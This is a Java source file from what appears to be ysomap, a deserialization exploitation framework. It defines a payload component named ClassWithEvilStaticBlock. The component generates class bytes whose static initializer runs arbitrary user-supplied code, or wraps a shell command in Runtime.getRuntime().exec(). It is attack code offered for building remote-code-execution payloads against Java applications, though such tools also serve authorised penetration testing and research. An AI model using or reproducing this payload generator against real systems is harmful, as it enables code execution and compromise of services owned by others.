package ysomap.core.gadget.bullet.objects;

import ysomap.annotation.NotNull;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.util.ClassFiles;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
public class ClassWithEvilStaticBlock extends Bullet<byte[]> {

    @NotNull
    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "body", detail = "代码或命令，如果是代码以'code:'打头")
    public String body;


    @Override
    public byte[] getObject() throws Exception {
        String code;
        if(body.startsWith("code:")){
            code = body.substring(5);
        }else{
            code = "java.lang.Runtime.getRuntime().exec(\"" +
                    body.replaceAll("\\\\","\\\\\\\\")
                            .replaceAll("\"", "\\\"") +
                    "\");";
        }
        return ClassFiles.makeClassWithStaticBlock(classname, code);
    }
}
